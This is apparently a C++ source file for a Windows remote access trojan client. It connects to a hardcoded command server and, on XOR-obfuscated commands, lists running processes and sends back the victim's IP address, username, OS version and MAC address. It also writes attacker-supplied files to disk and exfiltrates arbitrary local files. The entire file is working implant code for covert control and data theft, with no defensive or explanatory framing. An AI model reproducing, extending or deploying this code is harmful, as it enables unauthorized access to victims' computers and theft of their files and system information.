#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <windows.h>
#include <Lmcons.h>
#include <psapi.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

std::string getProcessName(DWORD processID);
std::string getIPAddress();
std::string encryptDecrypt(std::string data, std::string xorKey);
int sendToServer(std::string information, SOCKET sock, std::string xorKey);
void downloadFileFromServer(SOCKET clientSocket, char buf[], std::string xorKey);
void getProcesses(SOCKET socket, std::string xorKey);
std::string uploadFileToServer(std::string filePath);
std::string getProcessName(DWORD processID);
std::string getOperatingSystem();
std::string getMacAddress();
std::string getMacAddress();
std::string getIPAddress();
std::string getUsername();


std::string encryptDecrypt(std::string data, std::string xorKey) {
    std::string result = "";
    for(int i = 0; i < data.size(); i++){
        result += data[i] ^ xorKey[i % xorKey.size()];
    }

    return result;
}


int sendToServer(std::string information, SOCKET sock, std::string xorKey){
    std::string data = encryptDecrypt(information, xorKey);
    int sendResult = send(sock, data.c_str(), data.size() + 1, 0);
    if(sendResult == SOCKET_ERROR){
       return 1;
    }

    return 0;
}

void downloadFileFromServer(SOCKET clientSocket, char buf[], std::string xorKey){
    int bytesReceived;
    
    ZeroMemory(buf, 4096);
    bytesReceived = recv(clientSocket, buf, 4096, 0);
    std::string encryptedFileContents = std::string(buf, 0, bytesReceived);
    std::string fileContents = encryptDecrypt(encryptedFileContents, xorKey);
    if(fileContents != ""){
        ZeroMemory(buf, 4096);
        bytesReceived = recv(clientSocket, buf, 4096, 0);
        std::string encryptedFileName = std::string(buf, 0, bytesReceived);
        std::string fileName = encryptDecrypt(encryptedFileName, xorKey);

        std::ofstream file(fileName);

        file << fileContents;

        file.close();
    }
    
}

std::string uploadFileToServer(std::string filePath){
    std::string fileContents;

    std::ifstream file(filePath);
    if(file.fail()){
        std::cout << "[-] File: " << filePath << " does not exist" << std::endl;
        return "";
    }
    else{
        std::string line;
        while(getline(file, line)){
            fileContents += line;
        }

    }

    file.close();

    return fileContents;
}

void getProcesses(SOCKET socket, std::string xorKey){
    int sendResult;
    DWORD aProcesses[1024], needed, proceses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &needed)) {
        return;
    }

    proceses = needed / sizeof(DWORD);

    for (i = 0; i < proceses; i++) {
        if (aProcesses[i] != 0) {
            std::string processName = getProcessName(aProcesses[i]);
            if(processName != ""){
                std::cout << processName << std::endl;
                sendResult = sendToServer(processName, socket, xorKey);
                if(sendResult == 1){
                    std::cerr << "[-] Error Sending Process Name" << std::endl;
                    exit(1);
                }
            }
        }
    }

    std::string completeMessage = "DONE";
    std::cout << completeMessage << std::endl;
    sendResult = sendToServer(completeMessage, socket, xorKey);
    if(sendResult == 1){
        std::cerr << "[-] Error Sending Process Listing Complete Message" << std::endl;
        exit(1);
    }
}

std::string getProcessName(DWORD processID) {
    TCHAR szProcessName[MAX_PATH] = TEXT("");

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);

    if (NULL != hProcess) {
        HMODULE module;
        DWORD needed;

        if (EnumProcessModules(hProcess, &module, sizeof(module), &needed)) {
            GetModuleBaseName(hProcess, module, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    std::string processName;
    #ifndef UNICODE
        processName = szProcessName;
    #else
        std::wstring wStr = szProcessName;
        processName = std::string(wStr.begin(), wStr.end());
    #endif

    CloseHandle(hProcess);

    return processName;
}



//Function to get the client's Operating System
std::string getOperatingSystem(){
    HKEY key;
    TCHAR value[255];
    DWORD value_length = 255;
    LPCSTR subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
    LPCSTR name = "ProductName";
    DWORD type = REG_SZ;
    RegOpenKey(HKEY_LOCAL_MACHINE, subkey, &key);
    RegQueryValueEx(key, name, NULL, &type, (LPBYTE)&value, &value_length);
    RegCloseKey(key);
    

    std::string productName;
    #ifndef UNICODE
        productName = value;
    #else
        std::wstring wStr = value;
        productName = std::string(wStr.begin(), wStr.end());
    #endif



    return productName;
    
}

std::string getMacAddress(){
    std::string macAddress = "";

    DWORD dwRetVal;
    IPAddr DestIp = 0;
    IPAddr SrcIp = 0;
    ULONG MacAddr[2];
    ULONG PhysAddrLen = 6;

    BYTE *bPhysAddr;
    unsigned int i;

    DestIp = inet_addr(getIPAddress().c_str());
    SrcIp = inet_addr(getIPAddress().c_str());

    memset(&MacAddr, 0xff, sizeof(MacAddr));

    dwRetVal = SendARP(DestIp, SrcIp, &MacAddr, &PhysAddrLen);

    char * data = (char *) malloc(4096);

    if (dwRetVal == NO_ERROR){
        bPhysAddr = (BYTE *) &MacAddr;
        if(PhysAddrLen){
            for (i = 0; i < (int) PhysAddrLen; i++) {
                if (i == (PhysAddrLen - 1)){
                    sprintf(data, "%.2X\n", (int) bPhysAddr[i]);
                }
                else{
                    sprintf(data, "%.2X-", (int) bPhysAddr[i]);
                }
                macAddress += std::string(data);
            }
        }
    }else {
        std::cerr << "[-] Error Gathering Mac Address" << std::endl;
        exit(1);
    }

    return macAddress;
}

// Function to get the client's IP address
std::string getIPAddress(){
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    char hostName[255];
    gethostname(hostName, sizeof(hostName));

    struct hostent* host = gethostbyname(hostName);
    if (host == NULL) {
        WSACleanup();
        return "";
    }

    char* ipAddress = inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
    WSACleanup();
    return ipAddress;
}

// Function to get the client's username
std::string getUsername(){
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username, &size);
    std::string hostname;


    #ifndef UNICODE
        hostname = username;
    #else
        std::wstring temp = username;
        hostname = std::string(temp.begin(), temp.end());
    #endif

    return hostname;
}

int main(){
    std::string ipAddress = "192.168.197.41"; //change this value
    int port = 54000;

    //initalize WinSock
    WSAData data;
    WORD ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &data);
    if(wsResult != 0){
        std::cerr << "[-] Can't start Winsock" << std::endl;
        return 1;
    }

    //create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET){
        std::cerr << "[-] Can't Create socket" << std::endl;
        return 1;
    }

    //fill in a hint structure
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

    //connect to server
    int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
    if(connResult == SOCKET_ERROR){
        std::cerr << "[-] Can't Connect to Server" << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    char buf[4096];
   do {
    ZeroMemory(buf, 4096);
    int bytesReceived = recv(sock, buf, 4096, 0);
    std::cout << "Key: " << std::string(buf, 0, bytesReceived) << std::endl;
    std::string xorKey = std::string(buf, 0, bytesReceived);

    ZeroMemory(buf, 4096);
    bytesReceived = recv(sock, buf, 4096, 0);
    std::cout << "SERVER RESPONSE: " << std::string(buf, 0, bytesReceived) << std::endl;

    std::string encryptedCommand = std::string(buf, 0, bytesReceived);
    std::string command = encryptDecrypt(encryptedCommand, xorKey);

    if(command == "quit"){
        std::cout << "[+] Program is Quitting" << std::endl;
        break;
    }

    else if(command == "listProc"){
        std::cout << "[+] Requesting Process Listing" << std::endl;
        getProcesses(sock, xorKey);
    }
    
    else if(command == "upload"){
        std::cout << "[+] Upload File Sequence Beginning" << std::endl;
        std::string filePath;
            
        downloadFileFromServer(sock, buf, xorKey);
    }
    
    else if(command == "download"){
        std::cout << "[+] Download File Sequence Beginning" << std::endl;

        int bytesReceived;
        ZeroMemory(buf, 4096);
        bytesReceived = recv(sock, buf, 4096, 0);
        std::string encryptedFilePath = std::string(buf, 0, bytesReceived);
        std::string filePath = encryptDecrypt(encryptedFilePath, xorKey);

        std::string fileContents = uploadFileToServer(filePath);
        int sendResult;
        if(fileContents != ""){
            std::cout << "[+] File Contents Obtained" << std::endl;
        }
        sendResult = sendToServer(fileContents, sock, xorKey);
        if(sendResult == 1){
            std::cerr << "[-] Error Sending File Content Data" << std::endl;
            return 1;
        }

    }
    
    else if(command == "infoList") {
        std::cout << "[+] Listing Client's Information" << std::endl;
        std::string ipAddress = getIPAddress();
        std::string username = getUsername();
        std::string version = getOperatingSystem();
        std::string macAddress = getMacAddress();

        std::string allData;
        allData += "IP Address: " + ipAddress + "\nUsername: " + username + "\nVersion: " + version + "\nMac Address: " + macAddress;
        
        int sendResult;
        std::cout << ipAddress << std::endl;
        sendResult = sendToServer(allData, sock, xorKey);
        if(sendResult == 1){
            std::cerr << "[-] Error Sending Client Information Data" << std::endl;
            return 1;
        }

        std::cout << "[+] Information Listing Complete" << std::endl;
    }

    else{
        continue;
    }

   } while(true);

    closesocket(sock); 

    return 0;
}